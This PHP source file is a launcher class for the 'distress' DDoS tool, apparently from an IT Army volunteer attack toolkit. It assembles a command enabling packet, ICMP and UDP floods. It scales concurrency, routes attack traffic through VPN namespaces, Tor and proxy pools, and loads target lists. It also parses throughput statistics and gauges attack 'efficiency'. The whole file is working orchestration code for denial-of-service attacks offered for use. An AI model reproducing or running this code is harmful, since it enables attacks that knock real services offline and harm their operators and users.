<?php

// https://github.com/Yneth/distress-releases

class DistressApplication extends distressApplicationStatic
{
    private $stat = false;


    public function processLaunch()
    {
        global $DISTRESS_SCALE,
               $DISTRESS_PROXY_CONNECTIONS_PERCENT,
               $DISTRESS_USE_TOR,
               $DISTRESS_USE_UDP_FLOOD,
               $IT_ARMY_USER_ID,
               $DISTRESS_SINGLE_CPU_CORE_MODE;

        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        // ---

        $caScale = '';
        {
            $scale = $DISTRESS_SCALE;
            $currentVpnProviderMaxDistressScale = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('maxDistressScale');
            if ($currentVpnProviderMaxDistressScale) {
                $scale = min($DISTRESS_SCALE, $currentVpnProviderMaxDistressScale);
            }
            $caScale = "--concurrency=$scale";
        }


        $caUseTor = '';
        {
            if ($DISTRESS_USE_TOR   &&  $DISTRESS_SCALE > 128) {
                $torConnections = fitBetweenMinMax(1, 50, intRound($DISTRESS_SCALE / 300));
                $caUseTor = '--use-tor=' . $torConnections;
            }
        }

        $caUseMyIp = '';
        $distressProxyConnectionsPercent = $DISTRESS_PROXY_CONNECTIONS_PERCENT;
        {
            $currentVpnProviderDistressProxyConnectionsPercent = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('distressProxyConnectionsPercent');
            if ($currentVpnProviderDistressProxyConnectionsPercent !== null) {
                $distressProxyConnectionsPercent = $currentVpnProviderDistressProxyConnectionsPercent;
            }

            $distressProxyConnectionsPercent = intval($distressProxyConnectionsPercent);

            if ($distressProxyConnectionsPercent < 0  ||  $distressProxyConnectionsPercent > 100) {
                $distressProxyConnectionsPercent = 0;
            }

            $useMyIp = 100 - $distressProxyConnectionsPercent;
            if ($useMyIp) {
                $caUseMyIp = "--use-my-ip=$useMyIp";
            }
        }

        $caConfig = '';
        {
            $testConfig = static::prepareCustomFileForDistress('distress-test-config.bin');
            if ($testConfig) {
                $caConfig = '--config-path="' . $testConfig . '"';
            } else if (file_exists(static::$configFilePath)) {
                $caConfig = '--config-path="' . static::$configFilePath . '"';
            }
        }

        $caProxyPool = '--disable-pool-proxies';
        {
            if ($distressProxyConnectionsPercent) {
                $testProxyPool = static::prepareCustomFileForDistress('distress-test-proxies.bin');
                if ($testProxyPool) {
                    $caProxyPool = '--proxies-path="' . $testProxyPool . '"';
                } else if (file_exists(static::$proxyPoolFilePath)) {
                    $caProxyPool = '--proxies-path="' . static::$proxyPoolFilePath . '"';
                }
            }
        }

        $caLocalTargetsFile = '';
        {
            $testTargets = static::prepareCustomFileForDistress('distress-test-targets.bin');
            if ($testTargets) {
                $caLocalTargetsFile = '--targets-path="' . $testTargets . '"';
            } else if (file_exists(static::$targetsFilePath)) {
                $caLocalTargetsFile = '--targets-path="' . static::$targetsFilePath . '"';
            }
        }

        $caSource = '--source=x100';
        {
            if ($IT_ARMY_USER_ID) {
                $caSource .= '_' . $IT_ARMY_USER_ID;
            }
        }

        $caPacketFlood = '';
        {
            $caPacketFlood = "--enable-packet-flood";
        }

        $caIcmpFlood = '';
        {
            $caIcmpFlood = "--enable-icmp-flood";
        }

        $caUdpFlood = '';
        {
            $distressUseUdpFlood = $DISTRESS_USE_UDP_FLOOD;

            $currentVpnProviderDistressUseUdpFlood = $this->vpnConnection->getOpenVpnConfig()->getProvider()->getSetting('distressUseUdpFlood');
            if ($currentVpnProviderDistressUseUdpFlood !== null) {
                $distressUseUdpFlood = $currentVpnProviderDistressUseUdpFlood;
            }

            if ($distressUseUdpFlood) {
                $caUdpFlood = "--direct-udp-mixed-flood";
            } else {
                $caUdpFlood = "--disable-udp-flood";
            }
        }

        $caWorkerThreads = '--worker-threads=';
        {
            if ($DISTRESS_SINGLE_CPU_CORE_MODE) {
                $caWorkerThreads .= '0';
            } else {
                $caWorkerThreads .= '1';
            }
        }

        $caInterface = '--interface=' . $this->vpnConnection->netInterface;

        // ---

        $command =    'setsid   ip netns exec ' . $this->vpnConnection->getNetnsName()
                 . "   nice -n 10"
                 //. "   /sbin/runuser -p -u app-h -g app-h   --"
                 . "  " . static::$distressCliPath
                 . "  --disable-auto-update  --log-interval-sec=15  --json-logs"  // --disable-tcp-nodelay
                 . "  $caWorkerThreads"
                 . "  $caScale"
                 . "  $caPacketFlood"
                 . "  $caIcmpFlood"
                 . "  $caUdpFlood"
                 . "  $caUseMyIp"
                 . "  $caUseTor"
                 . "  $caProxyPool"
                 . "  $caConfig"
                 . "  $caLocalTargetsFile"
                 . "  $caInterface"
                 . "  $caSource"
                 . "  2>&1";

        $this->log('Launching Distress on VPN' . $this->vpnConnection->getIndex());
        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );

        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        usleep(50 * 1000);

        // ---

        $this->processShellPid = $this->isAlive();
        //passthru("pstree -g -p $this->processShellPid");

        // ---

        $childrenPids = [];
        getProcessPidWithChildrenPids($this->processShellPid, false, $childrenPids);
        $processFirstChildPid = $childrenPids[1] ?? false;
        $this->processChildrenPGid = $processFirstChildPid;

        // ---

        $this->processPid = 0;
        foreach ($childrenPids as $childPid) {
            if (!file_exists("/proc/$childPid/cmdline")) {
                continue;
            }
            $command = file_get_contents("/proc/$childPid/cmdline");
            if (substr($command, 0, strlen(static::$distressCliPath)) === static::$distressCliPath) {
                $this->processPid = $childPid;
                break;
            }
        }

        // ---

        if (!$this->processShellPid  ||  !$this->processPid) {
            $this->log('Command failed');
            $this->terminateAndKill(true);
            $this->launchFailed = true;
            return -1;
        }

        // ---

        if (posix_getpgid($this->processPid) !== $this->processChildrenPGid) {
            $this->log('Setsid failed');
            $this->terminateAndKill(true);
            $this->launchFailed = true;
            return -1;
        }

        // ---

        /*if ($DISTRESS_SINGLE_CPU_CORE_MODE) {
            static::$currentAffinityCoreId++;
            if (static::$currentAffinityCoreId >= $CPU_CORES_QUANTITY) {
                static::$currentAffinityCoreId = 0;
            }

            $stdout = trim(_shell_exec('taskset -cp ' . static::$currentAffinityCoreId . ' ' . $this->processPid));
            MainLog::log("\n$command\n$stdout");
        }*/

        // ---

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    protected function processJsonLine($line, $lineObj)
    {

        $level = $lineObj->level  ??  '';
        $msg   = $lineObj->msg    ??  '';

        if (
                $level === 'INFO'
            &&  strpos($msg, 'active connections=') !== false
        ) {

            $regExp = '#^active connections=([^,]+), pps=([^,]+), bps=([^,]+), requests=([^,]+), bytes=([^,]+), pending connections=(.*)$#';

            if (preg_match($regExp, mbTrim($msg), $matches) > 0) {
                $this->stat = new \stdClass();
                $this->stat->activeConnections  = $matches[1];
                $this->stat->pps                = $matches[2];
                $this->stat->bps                = $matches[3];
                $this->stat->requests           = $matches[4];
                $this->stat->bytes              = $matches[5];
                $this->stat->pendingConnections = $matches[6];
            }

        }

        if (val($lineObj, 'level') === 'INFO') {
            $ret = val($lineObj, 'msg') . "\n";
        } else {
            $ret  = $this->lineObjectToString($lineObj);
            $ret .= "\n\n";
        }

        return $ret;
    }

    // Should be called after pumpLog()
    public function getStatisticsBadge($returnSamePrevious = false) : ?string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT;

        $this->statisticsBadge = null;

        if (!$this->stat) {
            goto retu;
        }

        $columnsDefinition = [
            [
                'title' => ['Active ', 'connections'],
                'width' => $LOG_WIDTH - $LOG_PADDING_LEFT - 14 * 5 - 2,
                'alignRight' => true
            ],
            [
                'title' => ['PPS'],
                'width' => 14,
                'alignRight' => true
            ],
            [
                'title' => ['BPS'],
                'width' => 14,
                'alignRight' => true
            ],
            [
                'title' => ['Requests'],
                'width' => 14,
                'alignRight' => true
            ],
            [
                'title' => ['Bytes'],
                'width' => 14,
                'alignRight' => true
            ],
            [
                'title' => ['Pending', 'connections'],
                'width' => 14,
                'alignRight' => true
            ]
        ];

        $rows[] = [];
        $rows[] = [
            $this->stat->activeConnections,
            $this->stat->pps,
            $this->stat->bps,
            $this->stat->requests,
            $this->stat->bytes,
            $this->stat->pendingConnections
        ];

        $this->statisticsBadge = generateMonospaceTable($columnsDefinition, $rows);

        retu:

        return parent::getStatisticsBadge($returnSamePrevious);
    }

    // Should be called after pumpLog()
    public function getEfficiencyLevel()
    {
        $networkStats = $this->vpnConnection->calculateNetworkStats();
        if ($networkStats->session->transmitted) {
            // Let's assume that, if received traffic is 20 times larger than transmitted traffic,
            // then we have 100% response rate

            $responseRate = roundLarge($networkStats->session->received / 20 / $networkStats->session->transmitted * 100);
            if ($responseRate > 100) {
                $responseRate = 100;
            }
            return $responseRate;
        } else {
            return null;
        }
    }

    public function terminate($hasError)
    {
        if ($this->processChildrenPGid) {
            $this->log("Distress terminate PGID -{$this->processChildrenPGid}");
            @posix_kill(0 - $this->processChildrenPGid, SIGTERM);
        }

        $this->terminated = true;
    }

    public function kill()
    {
        if ($this->processChildrenPGid) {
            $this->log("Distress kill PGID -{$this->processChildrenPGid}");
            @posix_kill(0 - $this->processChildrenPGid, SIGKILL);
        }
        @proc_terminate($this->process, SIGKILL);
        @proc_close($this->process);
    }

}

distressApplication::constructStatic();